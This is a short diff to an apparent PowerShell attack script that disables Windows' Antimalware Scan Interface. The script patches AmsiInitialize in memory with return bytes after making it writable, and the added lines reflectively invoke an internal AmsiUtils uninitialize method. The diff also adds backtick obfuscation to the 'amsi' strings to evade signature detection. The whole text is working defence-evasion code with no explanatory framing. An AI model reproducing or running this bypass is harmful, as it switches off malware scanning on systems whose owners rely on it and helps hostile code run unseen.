@@ -18,9 +18,10 @@ public class Win32 {
 
 Add-Type $Win32
 
-$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
-$Address = [Win32]::GetProcAddress($LoadLibrary, "Am`si" + "In`itialize")
+$LoadLibrary = [Win32]::LoadLibrary("am`si.dll")
+$Address = [Win32]::GetProcAddress($LoadLibrary, "Am`si`In`itialize")
 $p = 0
+[ref].Assembly.GetType("System.Management.Automation.Am`siUtils").GetDeclaredMethod("Un`initialize").Invoke($null, $null)
 [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
 $Patch = [Byte[]] (0xC2, 0x08, 0x00)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 3)
